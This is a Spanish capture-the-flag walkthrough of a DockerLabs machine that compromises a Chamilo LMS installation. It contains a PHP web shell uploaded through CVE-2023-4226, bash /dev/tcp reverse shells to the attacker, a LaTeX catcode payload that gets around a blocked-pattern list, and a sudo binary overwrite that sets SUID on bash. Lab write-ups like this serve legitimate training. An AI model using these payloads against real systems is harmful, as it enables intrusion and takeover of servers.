---
icon: flag
---

# MachuPicchu DockerLabs (Intermediate)

## Instalación

Cuando obtenemos el `.zip` nos lo pasamos al entorno en el que vamos a empezar a hackear la maquina y haremos lo siguiente.

```shell
unzip machupicchu.zip
```

Nos lo descomprimira y despues montamos la maquina de la siguiente forma.

```shell
bash auto_deploy.sh machupicchu.tar
```

Info:

```
                            ##        .         
                      ## ## ##       ==         
                   ## ## ## ##      ===         
               /""""""""""""""""\___/ ===       
          ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
               \______ o          __/           
                 \    \        __/            
                  \____\______/               
                                          
  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____ 
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__  
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___] 
                                         
                                     

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

Por lo que cuando terminemos de hackearla, le damos a `Ctrl+C` y nos eliminara la maquina para que no se queden archivos basura.

### Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-29 12:32 EDT
Nmap scan report for chamilo.dl (172.17.0.2)
Host is up (0.000017s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 172.17.0.1
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rwxr-xr-x    1 0        0              96 Mar 26 19:44 alumno.txt
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
| http-git: 
|   172.17.0.2:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|     Remotes:
|       https://github.com/chamilo/chamilo-lms
|_    Project type: PHP application (guessed from .gitignore)
| http-robots.txt: 12 disallowed entries 
| /app/ /bin/ /documentation/ /home/ /main/ /plugin/ 
| /tests/ /vendor/ /license.txt /README.txt /whoisonline.php 
|_/whoisonlinesession.php
|_http-title: Trr0r - Trr0r Academy
|_http-generator: Chamilo 1
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.77 seconds
```

Cuando entramos en el puerto `80` vemos que nos redirecciona hacia un dominio llamado `chamilo.dl`, por lo que tendremos que añadirlo a nuestro archivo `hosts`.

```shell
nano /etc/hosts

#Dentro del nano
<IP>             chamilo.dl
```

Lo guardamos y si lo volvemos a recargar veremos lo siguiente:

<figure><img src="../../.gitbook/assets/image (5) (1) (1).png" alt=""><figcaption></figcaption></figure>

Vemos un `login` de un `software` llamado `Chamilo` pero que aun probando los `exploits` que hay asociados no funcionara, tambien vimos que hay un servidor `FTP`, por lo que vamos a investigara en el.

## FTP

Vamos a probar a entrar de forma anonima mediante el `FTP`.

```shell
ftp anonymous@<IP>
```

Dejamos la `password` vacia y veremos que estamos dentro, si listamos veremos lo siguiente:

```
229 Entering Extended Passive Mode (|||20290|)
150 Here comes the directory listing.
-rwxr-xr-x    1 0        0              96 Mar 26 19:44 alumno.txt
226 Directory send OK.
```

Vamos a descargarnos el archivo `alumno.txt`:

```shell
get alumno.txt
```

Ahora nos saldremos y veremos que contiene:

```
Estas son tus credenciales para el acceso como alumno al curso de Hacking Web: pepico:P@ssw0rd1
```

Vemos que son las credenciales de un usuario de la plataforma, por lo que vamos a probar a entrar con dichas credenciales.

Echo eso veremos que estamos dentro:

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Si nos vamos al siguiente apartado en `Red Social`:

```
URL = http://chamilo.dl/main/social/home.php
```

Y probamos a realizar un `XSS` metiendo el siguiente `payload` veremos lo siguiente:

```
<h1 style="color:red;">XSS</h1>
```

Info:

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Vemos que esta funcionando, pero no veremos nada mas interesante, si seguimos buscando algun `exploit` sobre dicho `Software` veremos lo siguiente:

URL = [Exploit Info CVE-2023-4226](https://starlabs.sg/advisories/23/23-4226/)

Vemos que nos explica como realizar la explotacion, vamos a seguirlo paso a paso, vamos a crear primero el `payload` para poder ejecutar comandos desde el `.php`:

```shell
nano cmd.php

#Dentro del nano
<?php
if (isset($_GET['cmd'])) {
    echo "<pre>";
    system($_GET['cmd']);
    echo "</pre>";
} else {
    echo "Usa ?cmd=COMANDO";
}
?>
```

Tambien tendremos que crear un `.htaccess` con el siguiente contenido para que podamos realizar el `exploit`.

```shell
nano .htaccess

#Dentro del nano
php_flag engine on
AcceptPathInfo on
<FilesMatch ".+">
    order allow,deny
    allow from all
</FilesMatch>
```

Ahora tendremos que obtener la `Cookie` de la sesion en la siguiente seccion:

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Y lo pondremos en el siguiente comando:

```shell
curl -s -b 'ch_sid=<COOKIE>' 'http://chamilo.dl/main/work/work.php?cidReq=<ID_COURSE>'
```

Si nosotros nos vamos en la pagina e intentamos acceder en el curso, no nos va a cargar, pero si nos va aparecer esto en la `URL`:

```
URL = http://chamilo.dl/courses/HW/
```

Vemos que el `ID` se llama `HW`, por lo que el comando tiene que quedar algo asi:

```shell
curl -s -b 'ch_sid=<COOKIE>' 'http://chamilo.dl/main/work/work.php?cidReq=HW'
```

Seguidamente ejecutaremos el siguiente comando:

```shell
curl -b 'ch_sid=<COOKIE>' -F 'files[0]=@cmd.php' -F 'files[1]=@.htaccess' 'http://chamilo.dl/main/inc/ajax/work.ajax.php?a=upload_file&chunkAction=send'
```

Con esto lo que hacemos es que dentro del archivo `work.ajax.php` tiene un `endpoint` llamado `a` en la que se puede subir archivos sin ningun tipo de restriccion, por lo que vamos a subir el archivo `cmd.php` y el archivo `.htaccess` que tenemos en el mismo directorio con `curl` y sus respectivos argumentos para cargarlo en el servidor.

Info:

```
{"files":{"files":{"name":["cmd.php",".htaccess"],"full_path":["cmd.php",".htaccess"],"type":["application\/octet-stream","application\/octet-stream"],"tmp_name":["\/tmp\/phpWT1QhG","\/tmp\/phpqBGKJ5"],"error":[0,0],"size":[139,109]}},"errorStatus":0}
```

Con esto vemos que ha funcionado, ahora si realizamos lo siguiente veremos esto:

```shell
curl 'http://chamilo.dl/app/cache/cmd.php?cmd=whoami'
```

Info:

```
<pre>www-data
</pre>
```

Vemos que esta funcionando, por lo que vamos a generarnos una `reverse shell`.

## Escalate user www-data

Vamos a ponernos a la escucha antes:

```shell
nc -lvnp <PORT>
```

Ahora dentro de la `URL` vamos a poner lo siguiente ajustado a nuestras necesidades:

```
URL = http://chamilo.dl/app/cache/cmd.php?cmd=bash -c 'bash -i >%26 /dev/tcp/<IP>/<PORT> 0>%261'
```

Cuando enviemos eso en la `URL` si volvemos a donde tenemos la escucha veremos lo siguiente:

```
listening on [any] 7777 ...
connect to [192.168.1.146] from (UNKNOWN) [172.17.0.2] 49944
bash: cannot set terminal process group (24): Inappropriate ioctl for device
bash: no job control in this shell
www-data@63a7ae251022:/var/www/chamilo.dl/app/cache$ whoami
whoami
www-data
```

Vemos que seremos dicho usuario, por lo que vamos a sanitizar la `shell`.

### Sanitizacion de shell (TTY)

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
```

## Escalate user trr0r

Si vemos los puertos/IPs que se estan corriendo en la maquina victima:

```shell
netstat -tuln
```

Info:

```
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 0.0.0.0:21              0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:1             0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:6200          0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN
```

Vemos que hay un `MySQL` corriendo a nivel local, pero algo interesante que vemos es que en la carpeta `/opt` vemos una aplicacion de `python` y que este mismo esta corriendo a nivel local en el puerto `6200` y si vemos que contiene con `curl` veremos lo siguiente:

```shell
curl http://127.0.0.1:6200/
```

Info:

```
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>LaTeX</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="/static/css/styles.css">
</head>
<body class="bg-dark text-light">
    <div class="container mt-5">
        <h1 class="text-center">🎯 LaTeX 🎯</h1>
        <p class="text-center">Introduce una expresión en LaTeX y genera un PDF.</p>

        <div class="card bg-secondary text-light shadow-lg p-4">
            <form action="/render" method="POST">
                <div class="mb-3">
                    <label for="formula" class="form-label">Código LaTeX:</label>
                    <textarea class="form-control" id="formula" name="formula" rows="4" placeholder="Escribe tu expresión aquí..."></textarea>
                </div>
                <button type="submit" class="btn btn-primary w-100">Generar PDF</button>
            </form>
        </div>
    </div>
</body>
```

Si inspeccionamos el codigo del archivo `app.py` veremos la siguiente linea:

```python
# Ejecutar pdflatex con manejo de errores
    subprocess.run(
            ["pdflatex", "--shell-escape" ,"-output-directory", WORK_DIR, tex_file],
            check=True,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
    )
```

Vemos que se puede realizar un `RCE` aprovechando dicha vulnerabilidad, pero tambien tiene esta lista de bloqueo:

```python
# Definir un directorio seguro dentro del proyecto para trabajar con archivos temporales
WORK_DIR = "/opt/latexapp/working_dir"
os.makedirs(WORK_DIR, exist_ok=True)  # Crear el directorio si no existe

BLOCKED_PATTERNS = [
    r"\\input",
    r"\\include",
    r"\\write",
    r"\\openout"
]

def is_malicious_latex(latex_code):
    """Verifica si el código LaTeX contiene patrones peligrosos"""
    for pattern in BLOCKED_PATTERNS:
        if re.search(pattern, latex_code):
            return True
    return False
```

Por lo que tendremos que realizar un `Bypass` de esto mismo.

Tras buscar mucho encontre una pagina la cual explica todo esto:

URL = [Info Exploit RCE Latex](https://book.jorianwoltjer.com/languages/latex)

Si nos vamos a la seccion llamada `Filter Bypass` podremos ver varios `payloads` que `Bypassean` la lista de bloqueo, pudiendo hacer un `RCE` como el usuario `trr0r`.

El payload que me ha funcionado que vi en la pagina fue el siguiente:

```latex
\catcode`X=0                % change meaning of X to 'escape character'
Xinput{|"id > /tmp/pwned"}  % use X as an escape character to run \input
```

Por lo que nuestro `payload` utilizando `curl` nos tendra que quedar de la siguiente forma:

```shell
curl -X POST -d 'formula=\catcode`X=0 Xinput{|"id > /tmp/pwned1"}' http://127.0.0.1:6200/render
```

Info:

```
Error generando el PDF
```

Aunque nos ponga eso, si listamos el `/tmp` veremos lo siguiente:

```
total 16
drwxrwxrwt 1 root  root  4096 Mar 30 12:25 .
drwxr-xr-x 1 root  root  4096 Mar 30 12:03 ..
-rw-r--r-- 1 trr0r trr0r   62 Mar 30 12:22 pwned
```

Ahora si leemos el archivo:

```
cat /tmp/pwned
```

Info:

```
uid=1000(trr0r) gid=1000(trr0r) groups=1000(trr0r),100(users)
```

Veremos que ha funcionado, por lo que vamos a probar a crear una `reverse shell` de la siguiente forma:

Vamos a crear antes el siguiente archivo:

```shell
nano /tmp/shell.sh

#Dentro del nano
#!/bin/bash

bash -i >& /dev/tcp/<IP>/<PORT> 0>&1
```

Lo guardamos y ponemos permisos de ejecuccion.

```shell
chmod +x /tmp/shell.sh
```

Vamos a ponernos a la escucha:

```shell
nc -lvnp <PORT>
```

Ahora ejecutamos el siguiente comando para poder ejecutar dicho archivo como el usuario `trr0r`.

```shell
curl -X POST -d 'formula=\catcode`X=0 Xinput{|"bash /tmp/shell.sh"}' http://127.0.0.1:6200/render
```

Si volvemos a donde tenemos la escucha veremos lo siguiente:

```
listening on [any] 5555 ...
connect to [192.168.1.146] from (UNKNOWN) [172.17.0.2] 57472
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
trr0r@7cd57fc28af5:/$ whoami
whoami
trr0r
```

Vemos que ha funcionado, por lo que vamos a leer la `flag` del usuario

> user.txt

```
8bd192048459eed4a4e7271ed86ad884
```

Vamos a sanitizar la shell.

### Sanitizacion de shell (TTY)

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
```

## Escalate Privileges

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for trr0r on 7cd57fc28af5:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User trr0r may run the following commands on 7cd57fc28af5:
    (ALL) NOPASSWD: /usr/bin/chash
```

Vemos que podemos ejecutar el binario `chash` como el usuario `root`, por lo que vamos a probar a realizar lo siguiente:

```shell
sudo /usr/bin/chash db:show_conn_info
```

Info:

```
PHP Warning:  "continue" targeting switch is equivalent to "break". Did you mean to use "continue 2"? in phar:///usr/bin/chash/vendor/doctrine/orm/lib/Doctrine/ORM/UnitOfWork.php on line 2640
Are you sure you want to show the database connection info here? (y/N)y
Database connection details:
Host:   127.0.0.1
User:   trr0r
Pass:   admiñçtrr0r
DB:     chamilo
Connection string (add password manually for increased security:
mysql -h 127.0.0.1 -u trr0r -p chamilo
```

Vemos que hemos obtenido las credenciales de la conexion a `mysql`.

Pero no podremos hacer gran cosa, ahora si vemos los permisos que tiene el `binario` veremos lo siguiente:

```shell
ls -la /usr/bin/chash
```

Info:

```
-rwxrwxr-x 1 root trr0r 31081158 Mar 26 18:51 /usr/bin/chash
```

Vemos que pertenecemos al grupo del `binario`, por lo que podremos hacer lo siguiente:

```shell
echo " " > /usr/bin/chash
```

```shell
nano /usr/bin/chash

#Dentro del nano
#!/bin/bash

chmod u+s /bin/bash
echo "Permisos cambiados con exito!"
```

Lo guardamos y ahora ejecutamos lo siguiente:

```shell
sudo /usr/bin/chash
```

Info:

```
Permisos cambiados con exito!
```

Ahora si listamos la `bash` veremos lo siguiente:

```shell
ls -la /bin/bash
```

Info:

```
-rwsr-xr-x 1 root root 1446024 Mar 31  2024 /bin/bash
```

Para poder ser `root` ejecutaremos esto:

```shell
bash -p
```

Info:

```
bash-5.2# whoami
root
```

Con esto veremos que seremos `root` por lo que leeremos la flag de `root`.

> root.txt

```
eb4585ad9fe0426781ed7c49252f8225
```
